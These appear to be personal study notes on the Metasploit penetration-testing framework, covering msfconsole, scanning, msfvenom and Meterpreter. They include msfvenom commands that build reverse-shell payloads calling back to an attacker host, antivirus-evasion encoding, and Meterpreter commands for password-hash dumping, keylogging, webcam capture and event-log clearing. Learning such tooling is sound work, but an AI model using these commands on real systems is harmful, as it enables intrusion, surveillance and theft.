---
title: Metasploit
date: 2025-03-17
updated: 2024-03-17 06:33:17Z
created: 2024-01-25 02:53:02Z
---

# Metasploit
- A exploitation framework
- Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation
- Allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more
## Main Components
### `msfconsole`
Stands for MetaSploit Framework console
The main command-line interface.
(`msfconsole` is the command to run metasploit)
### Modules
- supporting modules such as exploits, scanners, payloads, etc.
- small component build to support a specific task
### Tools
Stand-alone custom build tools
Example tools:
- `msfvenom`: can generate payload (have replaced Msfpayload and Msfencode)
	- Access to all payload
	- Create payload to all different format (PHP, exe, dll, elf, etc.)
	- and for many diffferent target system (Apple, Windows, Android, Linux, etc.).
- pattern_create
- pattern_offset 

## Terminology 
- Exploit: A piece of code that uses a vulnerability present on the target system.
- Vulnerability: A design, coding, or logic flaw affecting the target system. 
- Payload: the code that will run on the target system.

### Module and category
- **Auxilliary**: Any supporting module, such as scanners, crawlers and fuzzers
- **Encoders**: encode the exploit and payload to avoid signature-based antivirus detection (nowadays have limited success)
- **Evasion**: evade antivirus software
- **Exploits**: organized by target system
- **NOPs**: (No OPeration) do nothing
	- They are often used as a buffer to achieve consistent payload sizes. Represented in CPU family
- **Payloads**: codes that run malware or backdoor to the target system
	- A playload that allow to run command on the target system is called `shell`
	- **adapters**: An adapter wraps single payloads to convert them into different formats. e.g. wrapped in Powershell adapter means a single powershell command can execute the payload
	- **singles**: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
	- **stagers**:  (The initiator to download the whole payload) Responsible for setting up a connection channel between Metasploit and the target system. e.g. “Staged payloads” uploads a stager, then stager download the rest of the payload (stage). 
		- stagers is loaded directly to the memory, and thus easier to bypass by the antivirus detection
		- **stages**: The process of downloading the large payload
			- To differentiate stagers and stage: 
			- generic/shell_reverse_tcp: stagers when `_` between `shell_reverse`
			- windows/x64/shell/reverse_tcp: stage payload when `shell/reverse`
		- Usually require a special listener, such as the Metasploit multi/handler
	- **Stageless**: The opposite of stagers, slef-contained piece of code can be executed on the spot.
		- Its buskiness allow easier detection on an antivirus or intrusion detection program.
- **Post**: Usefull for the final stage of the pen-test: post-exploitation

# General Commands to Metasploit
## Summary Command
`info`
`tab`
`search type:[type name]`
`use [number]`
`show options` or `options`
`show payloads`
`set payloads`
`set` `setg`
`unset [param]`
`unset all`
`exploit`, `exploit -z`, `exploit -j` (run as background), `run`
`sessions`
- `info` further information on the module can be obtained by typing the info command
- `tab`, Command can be auto completed 
- Run metasploit as admin permission is required if listen on a port under 1024.
## Search/select the module
- `search` search the Metasploit Framework database for modules relevant to the given search parameter
	- conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.
	- `use 0`, things can be selected with searched number 
	- Can direct the search function using keywords such as type and platform
		- `search type:auxiliary telnet`
- `search type:auxiliary telnet`
## Select Module
- `use exploit/windows/smb/ms17_010_eternalblue`
- `show options`: show the current parameter
	- `show` can be followed by any module type: auxiliary, payload, exploit
	- `show auxiliary` `use 1128` exploit can be selected with the number
## Select payloads
- `show payloads` show other payloads that can be used with the exploit
- `set payloads [number]`
- `back` to go back a level (module wise)
## Set parameters
- `set`,  `unset [param]`, `unset all`
- `setg` set param for global module, `unsetg` or exit to clear it
- `RHOSTS`: 
	- can set to single IP address
	- can set to a range of address `10.10.132.12/16`
	- can set to a file with listed address `/path/of/the/target_file.txt`, one per line
- Msfconsole is managed by context; this means that **unless set as a global variable**, **all parameter settings will be lost if you change the module** you have decided to use
### Exploit
- `exploit`, `run`(is an alias to exploit) to launch the module
	- `exploit -z` will background the session
- `check` check if the target system is vulnerable without exploiting it.
### Post-exploit
- `sessions` to see the connected session
- when within the meterpreter interface, use `background` or `CTRL+Z` to go back to the msf6 interface
- `sessions -i [number]` to interact with any sessions
- `sessions -h` for more help
- `CTRL+Z` background
- `CTRL+C` abort
- Meterpreter: Meterpreter agent was loaded to the target system and connected back to you, similar to connecting to their database 
- hashdump module dump the user password hash in ntlm format


## Scanning
`search portscan`, 
- portscan options
	- `scanner/portscan/tcp`
    - CONCURRENCY: Number of targets to be scanned simultaneously.
    - PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
    - RHOSTS: Target or target network to be scanned.
    - THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.
	- use of `nmap -sS 10.10.12.229` might be faster than the msf module
- `scanner/discovery/udp_sweep` quickly identify running service
- `smb_enumshares` and `smb_version` useful for coorporate network
- When performing service scans, it would be **important not to omit more "exotic" services** such as NetBIOS

## Database
- start the PostgreSQL `systemctl start postgresql`
- initialize database `msfdb init`
- lauch `msfconsole` and check database `db_status`, note that the `help` command will showing database related help after lauching db services
- `workspace` to list available workspace
- `workspace -a [name]` to add workspace
- `workspace -d [name]` to delete workspace
- `workspace [name]` to switch workspace
- `workspace -h` to list available option for workspace
- `db_nmap` use nmap and record the output
- `hosts` `services` can reach relevant information with these command
- `hosts -h` `services -h` more information about the command
- `hosts -R` add hosts value (in database) to RHOSTS parameter

### Rank of the exploit:
![Rank of the exploit](../../../_resources/Screenshot%202024-01-26%20at%201.41.03 AM.png)
[Source of the picture](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)


# Msfvenom
- Simply put Msfvenom is "Reformatting the payload that is dedicated to metasploit into target system compatible executable file"
- `msfvenom --list formats` list supported output formats
- Encoders, can be useful  against some antivirus software
	- sample usage: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`
- Handlers is used to reveice the reverse shell message, also known as "catching a shell"
- Standard Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
	- e.g. `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
- Steps:
	- Create and convert the payload (preparation)
	- **Set LHOST and LPORT, note that the file will be send via an alternative channel, hence we want it to automatically connect to our session when executed, thus the LHOST and LPORT with be the attacks machine.**
		- Give the local machine IP address: LHOST will be the IP address of your attacking machine
		- Give local port to which the payload will connect: LPORT will be the port on which your handler will listen
		- e.g. `msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`
		- note that the name of the payload in msfconsole is `payload/php/reverse_php`
	- `use exploit/multi/handler` start a handlers in metasploit
	- set the parameter e.g. `set payload php/reverse_php`, `set lhost 10.0.2.19`, `set lport 7777`
	- `exploit` on msfconsole
- Some converted file (such as converted php files) needs to be manually fixed 
	- e.g. php file header tag and end tag needs to be fixed properly with `<?php [content] ?>`
- List the possible payload that can be ran with meterpreter: `msfvenom --list payloads | grep meterpreter`
- Example command and format:
	- Linux excutable (elf): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf` run `./rev_shell.elf` on the target machine.
	- Windows (exe): `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
	- PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
	- ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
	- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
	*The `-p` means the payload that exist within the metasploit
	***Usually the payload is already written in the certain system language indicated by `windows/`, `linux/`, the goal of the conversion like `-f exe > rev_shell.exe`  is to turn them to an actual executable file of the related system (the original file is only usuable within the metasploit framework), hence the `-f` option simply means turn it into 'the format that is allowed to be executed on the target system'.**

## Naming convention
- Payload naming convention
	- `<OS>/<arch>/<payload>`
	- e.g. `linux/x86/shell_reverse_tcp`
	- exception for Windows 32 bit: `windows/shell_reverse_tcp`
	- Windows 64 bit: `windows/x64/shell_reverse_tcp`
- Reverse shell naming convention:
	- Stageless with `_`: `shell_reverse_tcp`
	- Staged with `/`: `shell/reverse_tcp`
- Rules applied to Meterpreter
	- Stageless: `linux/x86/meterpreter_reverse_tcp`
	- Staged: `windows/x64/meterpreter/reverse_tcp`
	- `msfvenom --list payloads | grep "linux/x86/metepreter"`

# Meterpreter
- run within memory
- disguised as a processor
- Has multiple version, the factor that influence which version to use are the following three
	- The target OS
    - Components available on the target system e.g. python, java, etc
    - Network connection types you can have with the target system e.g. TCP, HTTPS, etc
- Some exploit by default uses meterpreter e.g. `exploit/windows/smb/ms17_010_eternalblue`
- use `post/multi/manage/shell_to_meterpreter` to convert from shell to meterpreter
- `ctrl+z` to set the current session to background

## General Commands Meterpreter
- `help` different version OS meterpreter has different command.
- Three type of category of tools:
	- Built-in commands
	- Meterpreter tools
	- Meterpreter scripting
### Basic Commands 
- **Core commands**: 
	`background`: Backgrounds the current session
    `exit`: Terminate the Meterpreter session
    `guid`: Get the session GUID (Globally Unique Identifier)
    `help`: Displays the help menu
    `info`: Displays information about a Post module
    `irb`: Opens an interactive Ruby shell on the current session
    -> `load`: Loads one or more Meterpreter extensions
		e.g. `load kiwi`, after loading the `help` command will include kiwi module help info
    -> `migrate [PID]`: Allows you to migrate Meterpreter to another process
		*Once the highter privilage move down, it might not be able to go back
    `run`: Executes a Meterpreter script or Post module
    `sessions [number]`: Quickly switch to another session
- **File system commands**
    `cd`: Will change directory
    `ls`: Will list files in the current directory (dir will also work)
    `pwd`: Prints the current working directory
    `edit`: will allow you to edit a file
    `cat`: Will show the contents of a file to the screen
    `rm`: Will delete the specified file
    -> `search`: Will search for files
		e.g. `search -f [filename]`
    `upload`: Will upload a file or directory
    `download`: Will download a file or directory
- **Networking commands**
    `arp`: Displays the host ARP (Address Resolution Protocol) cache
    `ifconfig`: Displays network interfaces available on the target system
    `netstat`: Displays the network connections
    `portfwd`: Forwards a local port to a remote service
    `route`: Allows you to view and modify the routing table
- **System commands**
    `clearev`: Clears the event logs
    `execute`: Executes a command
    `getpid`: Shows the current process identifier
    -> `getuid`: Shows the user that Meterpreter is running as
    `kill`: Terminates a process
    `pkill`: Terminates processes by name
    -> `ps`: Lists running processes
    `reboot`: Reboots the remote computer
    -> `shell`: Drops into a system command shell
    `shutdown`: Shuts down the remote computer
    `sysinfo`: Gets information about the remote system, such as OS
- All other commands including:
	- User interface commands
	- Webcam commands
	- Audio output commands
	- Elevate commands
	- Password database commands
	- Timestomp commands
    `idletime`: Returns the number of seconds the remote user has been idle
    -> `keyscan_dump`: Dumps the keystroke buffer
    -> `keyscan_start`: Starts capturing keystrokes
    -> `keyscan_stop`: Stops capturing keystrokes
    `screenshare`: Allows you to watch the remote user's desktop in real time
    `screenshot`: Grabs a screenshot of the interactive desktop
    `record_mic`: Records audio from the default microphone for X seconds
    `webcam_chat`: Starts a video chat
    `webcam_list`: Lists webcams
    `webcam_snap`: Takes a snapshot from the specified webcam
    `webcam_stream`: Plays a video stream from the specified webcam
    -> `getsystem`: Attempts to elevate your privilege to that of local system
    -> `hashdump`: Dumps the contents of the SAM database
